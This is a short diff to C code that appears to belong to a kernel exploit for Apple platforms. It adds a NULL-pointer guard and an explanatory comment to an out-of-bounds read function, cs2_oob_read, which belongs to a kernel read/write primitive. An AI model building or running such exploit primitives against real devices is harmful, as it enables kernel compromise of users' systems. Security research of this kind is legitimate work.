@@ -36,6 +36,22 @@ void cs2_init_phys_rw(mach_vm_size_t contiguous_mapping_size) {
 static uint64_t first_try_logs = 0;
 
 kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
+    /* 2026-11-21 the DETERMINISTIC SECOND-TAP crash fix (3 receipts:
+       P007OpenOnly-205702/210057/210504, all EXC_BAD_ACCESS at 0x18/0x30
+       in this fn from a cskrw double-tap). The first run's cleanup doesn't
+       fully reset; the second run's memset zeroes cs2_ctx.shared to NULL;
+       the setup then fails silently (fd table / port table / mappings
+       still held), and this fn dereferences shared->target_object_sync
+       at NULL+0x18 → the crash. NOT kernel corruption — a userspace NULL.
+       Fix: guard ALL the shared/pc/fd prerequisites before any access. */
+    if (!cs2_ctx.shared || !cs2_ctx.pc_address || cs2_ctx.read_fd < 0) {
+        LOG_ERR("cs2_oob_read: PREREQ FAIL (shared=%p pc_addr=0x%llx read_fd=%d) "
+                "— the setup failed (second-tap state?); honest stop",
+                cs2_ctx.shared,
+                (unsigned long long)cs2_ctx.pc_address,
+                cs2_ctx.read_fd);
+        return KERN_FAILURE;
+    }
     // target_object_sync here on first pass is set to memory_object from mem entry
     atomic_store_explicit(&cs2_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
     // offset we're at in the search mapping
